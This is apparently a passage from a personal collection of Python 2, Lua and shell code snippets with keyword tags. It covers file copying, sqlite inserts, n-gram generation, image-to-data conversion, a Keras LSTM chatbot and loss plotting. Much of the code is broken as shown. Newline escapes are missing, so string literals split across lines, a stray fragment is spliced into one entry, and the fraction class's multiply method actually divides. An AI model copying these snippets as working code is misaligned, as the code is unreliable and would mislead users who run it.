    numold = num

-----------------------------
number sequences overlap duplicates prevent duplicate overlap    

----
id:159

Select the text
Press Ctrl + H (or click Find->Replace)
Make sure you have selected ‘regular expression’ (press Alt + R)
Find what: ^

Replace With: (nothing, leave in blank)
remove blank lines, sublime text sublimetext text editor

----
id:160

# %load SEARCHdocs.py
from time import sleep
trak = []
def searchdocs(filename):
    f=open(filename).readlines()

    count = 0
    oldstart = 6
    oldcount = 0
    search = raw_input("SEARCH: ")
    for line in f:
        count = count +1
        if search in line:
            #append the trak list with the line number of each search term occurance
            #print count,newcount,oldcount
            if oldcount +6>count:
                pass
            else:
                trak.append(count)       
            oldcount = count 
            #print count,oldcount,trak
            #trak.append(count)
            line = line.replace("
", "")
            #print count
    f0=open(filename).readlines()
    CNT=0
    END = 0
    for line in f0:
        CNT=CNT+1
        for start in trak:
            START = start-6
            END = start+6
            #if search word appears in the first five lines the first line will start the response
            if START<0:START=0
            #print CNT,START,END
            if CNT>START and CNT<END:
                line = line.replace("
", "")
                if len(line)>3:
                    print CNT,line
    return
                        

----
id:161

# randomly shuffle a list of words shuffle words
import random
def list_random(ran):
    random.shuffle(ran)
    return ran[0],ran[1],ran[2],ran[3]

list_random(['This ', 'will', 'randomly', 'shuffle',             'words', 'and', 'display','four', 'of', 'them'])

----
id:162

locked db database locked can not use database 
Response to a locked database

!fuser /home/jack/hubiC/Databases/Stuff.db
!kill -9 18879

----
id:163

with open('output_file.txt','wb') as wfd:
    for f in ['seg1.txt','seg2.txt','seg3.txt']:
        with open(f,'rb') as fd:
            shutil.copyfileobj(fd, wfd, 1024*1024*10)
            #10MB per writing chunk to avoid reading big file into memory.

----
id:164

# create a list in memory of a directory
from time import sleep
import os
LST = []
PATH = "640x640/"
for files in sorted(os.listdir(PATH)):
    LST.append(PATH+files)
    
    
Then it may be used with:
    
    
for line in LST:
    print line    ig file into memory.

----
id:165

shell commands shutil
os.remove() will remove a file.
os.rmdir() will remove an empty directory.
shutil.rmtree() will delete a directory and all its contents
import shutil
import os
source = os.listdir("/tmp/")
destination = "/tmp/newfolder/"
for files in source:
    if files.endswith(".txt"):
        shutil.copy(files,destination)
---
import shutil  
shutil.copyfile('/path/to/file', '/path/to/other/phile')

mv move 
import shutil
import os
source = os.listdir("/tmp/")
destination = "/tmp/newfolder/"
for files in source:
    if files.endswith(".txt"):
        shutil.move(files,destination)
---------
import shutil
import os
SOURCE = "samples"
BACKUP = "samples-bak"
# create a backup directory
shutil.copytree(SOURCE, BACKUP)
print os.listdir(BACKUP)

shutil.rmtree('one/two/three')


----
id:166

import os
PATH = "cd/"
count=0
for File in sorted(os.listdir(PATH)):
    count=count+1
    filein = PATH+File
    base = ntpath.basename(filein)
    im = Image.open(filein)
    width, height = im.size   # Get dimensions
    if width>height:new_width = height;new_height=new_width
    if width<height:new_width = height;new_height=new_width    
    left = (width - new_width)/2
    top = (height - new_height)/2
    right = (width + new_width)/2
    bottom = (height + new_height)/2
    im0 = im.crop((left, top, right, bottom))
    img = im0.resize((640, 640), Image.NEAREST)
    filename = "cd640/"+base
    img.save(filename)
    os.remove(filein)

----
id:167

# Anagrams Generated from words.db
import sqlite3
import random
from random import randint
database = "words.db"
conn = sqlite3.connect(database)
conn.text_factory=str
c = conn.cursor()
# Get number of entries in database
c.execute("SELECT COUNT(*) from fun")
(number_of_rows,)=c.fetchone()
# Get a random ID ranging from 1 to ( number of rows )
ID = randint(1,number_of_rows)
# Select the ID from the database
for row in c.execute("SELECT word from fun WHERE ROWID = ?",(ID,)):
    s = row[0]
    #shuffle letters of the word in the results
    if len(s)>5:
        print (''.join(random.sample(s,len(s))))
    else:
        sz = len(s)
        print ("Try again, the random word was only ",sz," characters.")


----
id:168

import sqlite3
conn = sqlite3.connect("words.db")
c = conn.cursor()
c.execute("create table IF NOT EXISTS fun (id int PRIMARY KEY,word string)");
conn.commit()
with open('/usr/share/dict/words') as f:
    for i, word in enumerate(f):
        word = word.strip()
        word = unicode(word, 'latin1')
        # remove the words with an apostrophy
        if "'" not in word:
            c.execute("INSERT INTO fun VALUES (?, ?);", (i, word))
conn.commit()
conn.close()

----
id:169

%%writefile TestDB.txt
This is a small file  made
specificaly  to  hack with
sqlite. ------------------
1234567890      1234567890
1.2.3.4.5.6.7.8.9.10 . . .
a b c d e f g h i j k l m- 
Lines  have  26 characters
plus a  "
"  for new line
_________ repeat _________
This is a small file  made
specificaly  to  hack with
sqlite. ------------------
1234567890      1234567890
1.2.3.4.5.6.7.8.9.10 . . .
a b c d e f g h i j k l m- 
Lines  have  26 characters
plus a  "
"  for new line
_______    END-    _______

----------------------
import sqlite3
conn = sqlite3.connect("fun.db")
c = conn.cursor()
c.execute("create table IF NOT EXISTS fun (id int PRIMARY KEY,word string)");
conn.commit()
conn.close()
----------------------
import sqlite3
conn = sqlite3.connect("fun.db")
c = conn.cursor()
with open('TestDB.txt') as f:
    for i, word in enumerate(f):
        word = word.strip()
        word = unicode(word, 'latin1')
        c.execute("INSERT INTO fun VALUES (?, ?);", (i, word))
conn.commit()
conn.close()

----
id:170

import string
count = 0
with open("words.db", "r") as myfile:
    for line in myfile:
        printable = set(string.printable)
        line = filter(lambda x: x in printable, line)        
        line = str(line)
        lines = line.strip()
        if len(lines) > 2:
            print lines[0:18]
            count =count +1
            if count > 0:break


----
id:171

experimenting with hex file hex deciml
!hexdump -C words.db

import codecs
ASCII = codecs.decode(codecs.decode('435245415445205441424c452066756e','hex'),'ascii')
print ASCII

import codecs
ASCII = codecs.decode(codecs.decode('53514c69746520666f726d6174203300','hex'),'ascii')
print ASCII

import codecs
ASCII = codecs.decode(codecs.decode('10000101004020200000000200000003','hex'),'ascii')
print ASCII

!ls /usr/share/dict/
#american-english  cracklib-small	  words
#british-english   README.select-wordlist  words.pre-dictionaries-common

----
id:172

import numpy as np
import pandas as pd
import sys
sys.path.insert(0, "/usr/local/lib/python2.7/dist-packages")
import keras
from keras.models import Sequential
from keras.layers import Dense
from keras.layers import Dropout
from keras.layers import LSTM
from keras.utils import np_utils
from keras.callbacks import ModelCheckpoint
from keras.utils import np_utils

----
id:173

#%%writefile conversation.py
#!/usr/bin/python
# -*- coding: utf-8 -*-
__author__ = 'Oswaldo Ludwig'
__version__ = '1.01'

import numpy as np
import pandas as pd
import sys
sys.path.insert(0, "/usr/local/lib/python2.7/dist-packages")
import keras
from keras.models import Sequential
from keras.layers import Dense
from keras.layers import Dropout
from keras.layers import LSTM
from keras.utils import np_utils
from keras.callbacks import ModelCheckpoint

from keras.layers import Input, Embedding, LSTM, Dense, RepeatVector, Dropout, merge
from keras.optimizers import Adam 
from keras.models import Model
from keras.layers import concatenate
from keras.layers import Activation, Dense
from keras.preprocessing import sequence
#from keras.layers import concatenate
import keras.layers
from keras.layers import *

import keras.backend as K
import numpy as np
np.random.seed(1234)  # for reproducibility
import cPickle
import theano
import os.path
import sys
import nltk
import re
import time

#from keras.utils import plot_model
import keras.utils
from keras.utils import *

word_embedding_size = 100
sentence_embedding_size = 300
dictionary_size = 7000
maxlen_input = 50

vocabulary_file = 'vocabulary_movie'
weights_file = 'my_model_weights20.h5'
unknown_token = 'something'
file_saved_context = 'saved_context'
file_saved_answer = 'saved_answer'
name_of_computer = 'john'

def greedy_decoder(input):

    flag = 0
    prob = 1
    ans_partial = np.zeros((1,maxlen_input))
    ans_partial[0, -1] = 2  #  the index of the symbol BOS (begin of sentence)
    for k in range(maxlen_input - 1):
        ye = model.predict([input, ans_partial])
        yel = ye[0,:]
        p = np.max(yel)
        mp = np.argmax(ye)
        ans_partial[0, 0:-1] = ans_partial[0, 1:]
        ans_partial[0, -1] = mp
        if mp == 3:  #  he index of the symbol EOS (end of sentence)
            flag = 1
        if flag == 0:    
            prob = prob * p
    text = ''
    for k in ans_partial[0]:
        k = k.astype(int)
        if k < (dictionary_size-2):
            w = vocabulary[k]
            text = text + w[0] + ' '
    return(text, prob)
    
    
def preprocess(raw_word, name):
    
    l1 = ['won’t','won't','wouldn’t','wouldn't','’m', '’re', '’ve', '’ll', '’s','’d', 'n’t', ''m', ''re', ''ve', ''ll', ''s', ''d', 'can't', 'n't', 'B: ', 'A: ', ',', ';', '.', '?', '!', ':', '. ?', ',   .', '. ,', 'EOS', 'BOS', 'eos', 'bos']
    l2 = ['will not','will not','would not','would not',' am', ' are', ' have', ' will', ' is', ' had', ' not', ' am', ' are', ' have', ' will', ' is', ' had', 'can not', ' not', '', '', ' ,', ' ;', ' .', ' ?', ' !', ' :', '? ', '.', ',', '', '', '', '']
    l3 = ['-', '_', ' *', ' /', '* ', '/ ', '"', ' \"', '\ ', '--', '...', '. . .']
    l4 = ['jeffrey','fred','benjamin','paula','walter','rachel','andy','helen','harrington','kathy','ronnie','carl','annie','cole','ike','milo','cole','rick','johnny','loretta','cornelius','claire','romeo','casey','johnson','rudy','stanzi','cosgrove','wolfi','kevin','paulie','cindy','paulie','enzo','mikey','i\97','davis','jeffrey','norman','johnson','dolores','tom','brian','bruce','john','laurie','stella','dignan','elaine','jack','christ','george','frank','mary','amon','david','tom','joe','paul','sam','charlie','bob','marry','walter','james','jimmy','michael','rose','jim','peter','nick','eddie','johnny','jake','ted','mike','billy','louis','ed','jerry','alex','charles','tommy','bobby','betty','sid','dave','jeffrey','jeff','marty','richard','otis','gale','fred','bill','jones','smith','mickey']    

    raw_word = raw_word.lower()
    raw_word = raw_word.replace(', ' + name_of_computer, '')
    raw_word = raw_word.replace(name_of_computer + ' ,', '')

    for j, term in enumerate(l1):
        raw_word = raw_word.replace(term,l2[j])
        
    for term in l3:
        raw_word = raw_word.replace(term,' ')
    
    for term in l4:
        raw_word = raw_word.replace(', ' + term, ', ' + name)
        raw_word = raw_word.replace(' ' + term + ' ,' ,' ' + name + ' ,')
        raw_word = raw_word.replace('i am ' + term, 'i am ' + name_of_computer)
        raw_word = raw_word.replace('my name is' + term, 'my name is ' + name_of_computer)
    
    for j in range(30):
        raw_word = raw_word.replace('. .', '')
        raw_word = raw_word.replace('.  .', '')
        raw_word = raw_word.replace('..', '')
       
    for j in range(5):
        raw_word = raw_word.replace('  ', ' ')
        
    if raw_word[-1] <>  '!' and raw_word[-1] <> '?' and raw_word[-1] <> '.' and raw_word[-2:] <>  '! ' and raw_word[-2:] <> '? ' and raw_word[-2:] <> '. ':
        raw_word = raw_word + ' .'
    
    if raw_word == ' !' or raw_word == ' ?' or raw_word == ' .' or raw_word == ' ! ' or raw_word == ' ? ' or raw_word == ' . ':
        raw_word = 'what ?'
    
    if raw_word == '  .' or raw_word == ' .' or raw_word == '  . ':
        raw_word = 'i do not want to talk about it .'
      
    return raw_word

def tokenize(sentences):

    # Tokenizing the sentences into words:
    tokenized_sentences = nltk.word_tokenize(sentences.decode('utf-8'))
    index_to_word = [x[0] for x in vocabulary]
    word_to_index = dict([(w,i) for i,w in enumerate(index_to_word)])
    tokenized_sentences = [w if w in word_to_index else unknown_token for w in tokenized_sentences]
    X = np.asarray([word_to_index[w] for w in tokenized_sentences])
    s = X.size
    Q = np.zeros((1,maxlen_input))
    if s < (maxlen_input + 1):
        Q[0,- s:] = X
    else:
        Q[0,:] = X[- maxlen_input:]
    
    return Q

 # Open files to save the conversation for further training:
qf = open(file_saved_context, 'w')
af = open(file_saved_answer, 'w')

print('Starting the model...')

# *******************************************************************
# Keras model of the chatbot: 

#model = Sequential()
#model.add(LSTM(256, input_shape=(X.shape[1], X.shape[2]), return_sequences=True))
#model.add(Dropout(0.2))
#model.add(LSTM(256))
#model.add(Dropout(0.2))
#model.add(Dense(y.shape[1], activation='softmax'))

#from keras.layers import concatenate

# *******************************************************************

ad = Adam(lr=0.00005) 

input_context = Input(shape=(maxlen_input,), dtype='int32', name='the_context_text')
input_answer = Input(shape=(maxlen_input,), dtype='int32', name='the_answer_text_up_to_the_current_token')
LSTM_encoder = LSTM(sentence_embedding_size, name='Encode_context')
LSTM_decoder = LSTM(sentence_embedding_size, name='Encode_answer_up_to_the_current_token')
if os.path.isfile(weights_file):
    Shared_Embedding = Embedding(output_dim=word_embedding_size, input_dim=dictionary_size, input_length=maxlen_input, name='Shared')
else:
    Shared_Embedding = Embedding(output_dim=word_embedding_size, input_dim=dictionary_size, weights=[embedding_matrix], input_length=maxlen_input, name='Shared')
word_embedding_context = Shared_Embedding(input_context)
context_embedding = LSTM_encoder(word_embedding_context)

word_embedding_answer = Shared_Embedding(input_answer)
answer_embedding = LSTM_decoder(word_embedding_answer)

merge_layer = concatenate([context_embedding, answer_embedding], axis=1, name='concatenate_the_embeddings_of_the_context_and_the_answer_up_to_current_token')
out = Dense(dictionary_size/2, activation="relu", name='relu_activation')(merge_layer)
out = Dense(dictionary_size, activation="softmax", name='likelihood_of_the_current_token_using_softmax_activation')(out)

model = Model(inputs=[input_context, input_answer], outputs = [out])

model.compile(loss='categorical_crossentropy', optimizer=ad)

plot_model(model, to_file='model_graph.png')    

if os.path.isfile(weights_file):
    model.load_weights(weights_file)


# Loading the data:
vocabulary = cPickle.load(open(vocabulary_file, 'rb'))

print("
 
 CHAT:     
")

# Processing the user query:
prob = 0
que = ''
last_query  = ' '
last_last_query = ''
text = ' '
last_text = ''
print('computer: hi ! please type your name.
')
name = raw_input('user: ')
print('computer: hi , ' + name +' ! My name is ' + name_of_computer + '.
') 


while que <> 'exit .':
    
    que = raw_input('user: ')
    que = preprocess(que, name_of_computer)
    # Collecting data for training:
    q = last_query + ' ' + text
    a = que
    qf.write(q + '
')
    af.write(a + '
')
    # Composing the context:
    if prob > 0.2:
        query = text + ' ' + que
    else:    
        query = que
   
    last_text = text
    
    Q = tokenize(query)
    # Using the trained model to predict the answer:
    predout, prob = greedy_decoder(Q[0:1])
    start_index = predout.find('EOS')
    text = preprocess(predout[0:start_index], name)
    print ('computer: ' + text + '    (with probability of %f)'%prob)
    
    last_last_query = last_query    
    last_query = que

qf.close()
af.close()


----
id:174

from __future__ import print_function
import TEXT
from nltk.text import Text
from nltk.probability import FreqDist
import string
import os
print("*** EXTENDED text for localbooks ***")
print("Type: 'textS()' or 'sentS()' to list the materials.")
def textS(infile):
    AWG = open(infile,'r').readlines()
    name = os.path.basename(infile)
    text22 = [AWG, name]
    print("text22:", text22[1])
    return AWG

infile = "TEXT/ALL_WIKI_GOOD.txt"
textS(infile)

----
id:175

%%writefile TEXT/load.py
" ""
Usage default:
loads /home/jack/Desktop/TEXT/ALL_WIKI_GOOD.txt
from TEXT import load
print (load.TEX())
May be used:

from TEXT import load
infile = "/home/jack/Desktop/TEXT_NLTK/ch03.html"
print (load.TEX(infile))
" ""
def TEX(infile="/home/jack/Desktop/TEXT/ALL_WIKI_GOOD.txt"):
    data = open(infile, 'r').read()
    return data

----
id:176

import sqlite3
conn = sqlite3.connect("/home/jack/hubiC/Databases/SNIPPETS.db")
#conn.text_factory = lambda x: unicode(x, "utf-8", "ignore")
conn.text_factory=str
c = conn.cursor()
code = ""

""
keywords = ""

""
c.execute("INSERT into snippets values (?,?)", (code, keywords))
conn.commit()
c.execute("SELECT rowid,* FROM snippets WHERE rowid = (SELECT MAX(rowid) FROM snippets)")
for row in c.fetchall():
    print row[0],row[1],row[2]
c.close()
conn.close()    

----
id:177

import string
import re
def cleanInput(input):
    input = re.sub('
+', " ", input)
    input = re.sub('\[[0-9]*\]', "", input)
    input = re.sub(' +', " ", input)
    #input = bytes(input, "UTF-8")
    input = bytes(input)
    input = input.decode("ascii", "ignore")
    cleanInput = []
    input = input.split(' ')
    for item in input:
        item = item.strip(string.punctuation)
        if len(item) > 1 or (item.lower() == 'a' or item.lower() == 'i'):
            cleanInput.append(item)
    return cleanInput

def ngrams(input, n):
    input = cleanInput(input)
    output = []
    for i in range(len(input)-n+1):
        output.append(input[i:i+n])
    return output


sub ="Each assembly language is specific to a particular computer architecture . In contrast , most high-level"

for X in ngrams(sub, 3):
    print " ".join(X)
    
--------------------
ngrams bigrams groups word groups
    

----
id:178

import string
import re
from random import randint

def cleanInput(input):
    input = re.sub('
+', " ", input)
    input = re.sub('\[[0-9]*\]', "", input)
    input = re.sub(' +', " ", input)
    #input = bytes(input, "UTF-8")
    input = bytes(input)
    input = input.decode("ascii", "ignore")
    cleanInput = []
    input = input.split(' ')
    for item in input:
        item = item.strip(string.punctuation)
        if len(item) > 1 or (item.lower() == 'a' or item.lower() == 'i'):
            cleanInput.append(item)
    return cleanInput

def Ngrams(input, n):
    input = cleanInput(input)
    output = []
    for i in range(len(input)-n+1):
        output.append(input[i:i+n])
    return output

def ngrams(input, n):
    input = cleanInput(input)
    output = {}
    for i in range(len(input)-n+1):
        ngramTemp = " ".join(input[i:i+n])
        if ngramTemp not in output:
            output[ngramTemp] = 0
        output[ngramTemp] += 1
    return output


def wordListSum(wordList):    #content = str(urlopen("http://pythonscrapingcom/files/inaugurationSpeech.txt").read()
    Sum = 0
    for word, value in wordList.items():
        Sum += value
    return Sum

def retrieveRandomWord(wordList):
    randIndex = randint(1, wordListSum(wordList))
    for word, value in wordList.items():
        randIndex -= value
        if randIndex <= 0:
            return word

sub =""
Each assembly language is specific to a particular computer architecture . In contrast , most high-level 
programming languages are generally portable across multiple architectures but require interpreting or 
compiling . Assembly language may also be called symbolic machine code . Assembly language is converted 
into executable machine code by a utility program referred to as an assembler . The conversion process is 
referred to as assembly , or assembling the source code . Assembly time is the computational step where 
an assembler is run .
""

wordList = ngrams(sub, 4)

wordListSum(wordList)

print retrieveRandomWord(wordList)
-----------------
ngrams bigrams groups word groups random words random text

----
id:179

# GRAYSCALE IMAGE

from PIL import Image
import numpy as np
import cv2
import matplotlib.pyplot as plt
%matplotlib inline
gray = []
#We open the JPG image with OpenCV:
data0 = open("datagray.txt", "a")
img = cv2.imread("/home/jack/Pictures/bluesaway.jpg",0)
#gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
for c in img:
      gray.append(c)
def mkim(data0):
    count=0
    for lines in gray:
        count=count+1
        data0.write(lines)
data = open("datagray.txt", "a")            
mkim(data0)
color = (255,255,255)
im = Image.new('L', (650,650), 'white')        
data = open("datagray.txt", "r").read()
im.putdata(data)
im

# COLOR IMAGE

from PIL import Image
import numpy as np
import cv2
import matplotlib.pyplot as plt
%matplotlib inline
gry = []
#We open the JPG image with OpenCV:
img = cv2.imread("/home/jack/Pictures/bluesaway.jpg")
#gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
for c in img:
    for b in c:
        gry.append(b)
def mkim(data):
    count=0
    for lines in gry:
        count=count+1
        data.write(lines)
data = open("data3.txt", "a")            
mkim(data)
data = open("data3.txt", "r").read()
im = Image.frombytes("RGB", (650,649), data)
im.save("test5.jpg", "JPEG")
im 
-------------------------------------
image to data, data to image, imagedata, dataimage, color image2data
grayscaledata ,grayscale data, images grayscaledata
image to data data to image imagedata dataimage color image to data
grayscale grayscale images data images grayscale data

----
id:180

# THIS WORKED FINE

import sys
count = 0
# input.txt 540mg
# output_file.txt 14.6mg
d = open('output_file.txt','a')
with open("input.txt") as inf:
    for line in inf:
        count = count +1
        d.write(line)
        if count >50000:
            sys.exit()
            d.close()    
            del d
            del inf
            
---------------
large files, open large files, create small file from large, large data, 
create-small-file from large, large-data, large-files, open-large-files, 

----
id:181

import time
#DATE = time.strftime("%Y-%m%d%H%M%S")
DATE = time.strftime("%Y-%m%d:%H")
DATE 
-----------------------------------
get time to date-filename use date as filename
time for filename to filename as date use date-as-filename
get-time, date-filename, use date as filename

----
id:182

import sys
filename = "/home/jack/Desktop/TEXT_NLTK/TEXT/char-rnn/bible/bible.txt"
filename0 = open("/home/jack/Desktop/TEXT_NLTK/TEXT/char-rnn/bible/newbible0.txt", "a")
count = 0
for f in open(filename).readlines():
    count = count +1
    f= f.replace(" :"," ::XXXXX")
    f= f.replace("
", "XXXXX")
    f= f.split("XXXXX")
    for line in f:
        count  = count +1
        line = line.replace("
", "")
        if "::" not in line:
            filename0.write(line) 

----
id:183

import glob
import os
from __future__ import division
import matplotlib
import matplotlib.pyplot as plt
import numpy as np
os.remove("wdat")
# built is list ' samp ' of all models in a directory
samp = []
PATH = "/home/jack/Desktop/TEXT_NLTK/TEXT/char-rnn/witch/"
files = glob.glob(PATH+"*.t7")
files.sort(key=os.path.getmtime)
line = ("
".join(files))
samp.append(line)
# clear the memory of any prior files that may have been created
# prevents the accidental printing of memory to the file 
try:
    del line
    del li
except:
    pass
fn = open("wdat", "a")
count = 0
for line in samp:
    line = line.split()
    for li in line:
        count = count +1
        if count>2:
            #print count-2,li
            li = li[-9:-3]
            #skips the first entry then print a comma before every ' li ' written
            # this avoids a tailing comma
            if count>3:fn.write(", ")
            fn.write(li)            
            
fn.close() 

num = 0
for n in open("wdat", "r").read().split(","):
    num = num+1
b = num    
a = 43
c = a / b
#np.arange(0.0, a, c)

#steps = 79
#t = range(0,steps)
fname = "wdat"
s = np.loadtxt(fname, dtype='float', comments='#', delimiter=",")
#s = (2.8920 , 2.2190 , 2.0573 , 1.9742 , 1.8616 , 1.8021 , 1.7422 , 1.7081 , 1.6884 , 1.6534 , 1.6351 , 1.6167 , 1.6084 , 1.5963 , 1.5953 , 1.5796 , 1.5654 , 1.5635 , 1.5472 , 1.5382 , 1.5329 , 1.5264 , 1.5266 , 1.5185 , 1.5118 , 1.5068 , 1.5075 , 1.5025 , 1.4998 , 1.4988 , 1.4974 , 1.4933 , 1.4945 , 1.4968 , 1.4859 , 1.4848 , 1.4840 , 1.4762 , 1.4718 , 1.4735 , 1.4684 , 1.4658 , 1.4609 , 1.4645 , 1.4587 , 1.4571 , 1.4533 , 1.4508 , 1.4483 , 1.4420 , 1.4363 , 1.4290 , 1.4219 , 1.4170 , 1.4013 , 1.3768 , 1.3657 , 1.3676 , 1.3694 , 1.3784 , 1.3823 , 1.3918 , 1.3867 , 1.3873 , 1.3894 , 1.3933 , 1.4013 , 1.3953 , 1.3955 , 1.3954 , 1.4042 , 1.3995 , 1.3992 , 1.3995 , 1.4001 , 1.3994 , 1.3983 , 1.3922 , 1.3970 )
t = np.arange(0.0, a, c)
# Note that using plt.subplots below is equivalent to using
# fig = plt.figure() and then ax = fig.add_subplot(111)
fig, ax = plt.subplots(dpi=100)
ax.plot(t, s)
ax.set(xlabel='Epochs(s)', ylabel='Training Loss',
       title='Graph Training Loss Samples')
ax.grid()
fig.savefig("Graph-Training-Loss-Samples.png")
plt.show()
------------------------
gru graph, graph loss, graph from filenames, model graphs
lstm graph, rnn graph loss, graph filenames, model graphs

----
id:184

working fine
local sqlite3 = require("lsqlite3")
require("gnuplot")
--os.remove('test2.db')
local db = sqlite3.open('urantia.db')

--db:exec"CREATE TABLE test (content);"
--VAR = "EVEN MORE new Test Data"
--db:exec('INSERT INTO test VALUES ("'..VAR..'")')

--Delete below is working
--ROID = 1
--db:exec('DELETE FROM test WHERE ROWID =("'..ROID..'")')

for row in db:nrows("SELECT rowid,* FROM test") do
  X, Y = row.rowid, row.content
  Xx = string.sub (Y , 39, 49) 
  --x=torch.linspace(Xx)
  --gnuplot.plot(torch.Y)
  print(Xx)
end
----------------------------------
Lua database lua database select substrings string.sub plot with Lua, gnuplot
Lua database, lua, database, lua substrings, Lua substrings,, string.sub, plot with Lua,

----
id:185

Zen = ['1.9518', '1.7194', '1.5912', '1.2925']
import StringIO
output = StringIO.StringIO()
output.write('This is one line.
')
print >>output, 'This is another'
print >>output,Zen 
# Retrieve file contents -- this will be
# 'First line.
Second line.
'
contents = output.getvalue()

# Close object and discard memory buffer --
print contents
# Close object, output buffer 
output.close()
----------------------------
Create memory file, file in memory Create file in memory 

----
id:186

import os
import os.path
title = "wiki.list"
samp = []
f= open(title,"w");f.close()
PATH = "/home/jack/Desktop/TEXT_NLTK/TEXT/char-rnn/wiki/"
count=0
for dirpath, dirnames, filenames in os.walk(PATH):
    for filename in [f for f in filenames if f.endswith(".t7")]:
        if len(filename)>20:
            AZ = filename[-9:-3]
            samp.append(AZ)
--------------            
Create a list of files in a directory, create list, list directory, select filetpyes 
list extension. fins extension, Create list files, Create file list            
            

----
id:187

# remove characters before a string
#the 1 in split('_', 1) means the first underscore
print '1-No_under_score_please-1'.split('_', 1)[-1]
print '2-No_under_score_please-1'.split('_', 1)[0]
print '3-No_under_score_please-1'.split('_', 1)[1]
print '4-No_under_score_please-1'.split('_', 3)[2]

print '5-No_under_score-1'.split('_', 2)[-1]

print '6-No_under_score-1'.split('_', 2)[0]
print '7-No_under_score-1'.split('_', 2)[1]
print '8-No_under_score-1'.split('_', 2)[2]
print '9-No_under_score-1'.split('_', 2)[-3]

#           1  2 3    4    5 6       7    8        9   10        11
text = "This is a text with a special area removed. Try Something Hard"
print text.split(' ', 5)[-1]
X = text.split(' ', 10)[2:6]
print X
print " ".join(X)

print text.split(' ', 9)[-1]

----
id:188

import fileinput
import glob

def Join(PATH, newfile, N):
    outfile = open(newfile, 'a')
    for line in fileinput.input(glob.glob(PATH+"*.txt")):
        outfile.write(line)
        outfile.write("
")
    count = 0
    outfile = open(newfile, 'r').readlines()
    for line in outfile:
        count = count +1
        if count<N:
            print line
    LineCount = "Line Count",count        
    return LineCount            

newfile= 'kuran1.txt'
PATH = 'kuran/'
N = 6
Join(PATH, newfile, N)
--------------------------------------------
copy files, join text files, join files, search files, 
search and join search join contanate files join file function

----
id:189

import sqlite3
conn = sqlite3.connect('ngram.db')
conn.text_factory = lambda x: unicode(x, "utf-8", "ignore")
c = conn.cursor()
c.execute("CREATE TABLE IF NOT EXISTS ngram(src, res, val)")
from time import sleep
import sqlite3
conn = sqlite3.connect('ngram.db')
c = conn.cursor()
fileout = "short-test-ngram5.txt"
view = open(fileout, "r").readlines()
for rows in view:
    rows = rows.replace("
","")
    rowz= str(rows)
    rowZ = rowz.split(" ")
    src = rowZ[0]
    res = rowZ[1]
    val = rowZ[2]
    c.execute("INSERT into ngram(src,res,val) values (?,?,?)",(src,res,val))
conn.commit()
-----------------------------
insert ngram, insert list, list database, ngram database

----
id:190

#!/usr/bin/env python
#from __future__ import print_function
import io
import string
import enchant
d = enchant.Dict("en_US")
filein = "www.gutenberg.lib/text/ALLfiles.txt"
fileout ="ngram-from Allfiles.txt"
whitelist = set('abcdefghijklmnopqrstuvwxy ABCDEFGHIJKLMNOPQRSTUVWXYZ')
IN = open(filein,"r").readlines()
OUT = open(fileout,"a")
count = 0
for line in IN:
    #line = line.encode('ascii', 'ignore')
    printable = set(string.printable)
    line = filter(lambda x: x in printable, line)
    line = ''.join(filter(whitelist.__contains__, line)) 
    line = line.replace("u'","")
    line = line.replace("_"," ")
    line = line.replace('"',' ')
    line = line.replace("-"," ")
    line = line.replace(":"," ")
    line = line.replace(")","")
    line = line.replace("(","")
    line = line.replace(".","")
    line = line.replace(";"," ")
    line = line.replace("/"," ")
    line = line.replace("   "," ")
    line = line.replace("  "," ")
    line = line.replace("  "," ")
   
    newline = line.lower()
    newline = newline.replace("
", "")
    if len(newline)>100:
            newline = newline.split(" ")
            for word in newline:
                count = count +1
                #if count<100:print word
                #if count > 16 and count < 160 and len(word)>1:
                if len(word)>0:    
                    if d.check(word) == True:
                        #if count > 2000:sys.exit()
                        OUT.write(word+", ")
                        count = count +1
                        #print (count)
                        #if count %25 == 0:OUT.write("
")
                        
OUT.close()


----
id:191

import urllib2
import os
# Download the file 'google-10000-english-usa.txt: if it does not exist.
url="https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english-usa.txt"
# Translate url into a filename
filename = url.split('/')[-1]
if not os.path.exists(filename):
    outfile = open(filename, "w")
    outfile.write(urllib2.urlopen(url).read())
    outfile.close()

----
id:192
fuser -k 8000/tcp
kill a process on a port

----
id:193

sudo screen -d -m python manage.py runserver
keep process running after signing out of VPS

----
id:194

opencv https://prateekvjoshi.com/2013/10/18/package-opencv-not-found-lets-find-it/
----
id:195

from colorthief import ColorThief

    color_thief = ColorThief('/path/to/imagefile')
    # get the dominant color
    dominant_color = color_thief.get_color(quality=1)
    # build a color palette
    palette = color_thief.get_palette(color_count=6)

----
id:196

file:///home/conda/Desktop/NoteBooks/GRAPHICS/html-image-editors 
graphics editors web webstuff web-stuff
----
id:197

#!/home/jack/anaconda2/envs/py35/bin/python
# get the size of a list of files
import os
f = open('sqlitedatabases.txt', 'r').readlines()
f0 = open('sqlitedatabases-size.txt', 'w')
for line in f:
    line = line.replace('
','')
    sz = os.path.getsize(line)
    sz=str(sz)
    f0.write(line+', '+sz+'
')
f0.close() 

----
id:198

# get the size of a list of files
#getting a list is easy  locate *.db >>sqlitedatabases.txt
#print there list
f0 = open('sqlitedatabases-size.txt', 'r').readlines()
for line in f0:
    line = line.replace('
','')
    line = line.split(', ')
    if int(line[1]) > int(1004135424):
        print line[0]
        print line[1]
#SNIPPETS 450.5kb = 405504      4 398 080   pointillist.db 1004135424

----
id:199

install opencv https://medium.com/@debugvn/installing-opencv-3-3-0-on-ubuntu-16-04-lts-7db376f93961 

----
id:201

def mkDIR(DIR):
    import os
    from os import path
    #trying to make directory if it does not already exist:
    if not os.path.exists(DIR):
        print DIR,' Did not Exist'
        os.mkdir(DIR)
    if os.path.exists(DIR):
        print DIR, 'Now Exists'
make directory mkdir if not exist
----
id:202

add subtract multiply divide fractions
from fractions import Fraction
class Thefraction:
    def __init__(self,a,b):
        self.a = a
        self.b =b
    def add(self):
        return self.a+ self.b
    def subtract(self):
        return self.a-self.b
    def divide(self):
        return self.a/self.b
    def multiply(self):
        return self.a/self.b

if __name__=='__main__':
    try:
        a = Fraction(input('Please type first fraction '))
        b = Fraction(input('Please type second fraction '))
        choice = int(input('Please select one of these 1. add 2. subtract 3. divide 4. multiply '))
        if choice ==1:
            print(Thefraction(a,b).add())
        elif choice==2:
            print(Thefraction(a,b).subtract())
        elif choice==3:
            print(Thefraction(a,b).divide())
        elif choice==4:
            print(Thefraction(a,b).multiply())
